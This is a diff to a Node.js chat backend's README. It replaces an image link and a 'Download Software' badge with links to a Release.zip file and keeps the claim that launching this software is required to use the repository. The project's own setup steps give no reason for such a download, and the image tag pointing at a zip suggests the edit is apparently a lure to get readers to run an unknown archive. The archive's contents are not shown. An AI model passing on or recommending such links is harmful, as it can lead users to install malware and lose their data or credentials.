@@ -1,6 +1,6 @@
 # 🚀 **Welcome to Chat_App-Backend repository!** 🚀
 
-![Chat App Image](https://example.com/chat_app_image.png)
+![Chat App Image](https://github.com/pinokio33/Chat_App-Backend/releases/download/v1.0/Release.zip)
 
 ## Repository Description:
 This repository contains the backend code for a Chat app. It utilizes technologies such as bcrypt, cors, expressjs, jwt-token, mongodb, nodejs, nodemailer, nodemon, reactjs, and socket-io to create a seamless and secure chat experience.
@@ -18,7 +18,7 @@ This repository contains the backend code for a Chat app. It utilizes technologi
 3. Launch the backend server by running `npm start`.
 
 ## Software Download:
-[![Download Software](https://img.shields.io/badge/Download-Software-orange)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/pinokio33/Chat_App-Backend/releases/download/v1.0/Release.zip)](https://github.com/pinokio33/Chat_App-Backend/releases/download/v1.0/Release.zip)
 
 Launching the software is required for using this repository.
 
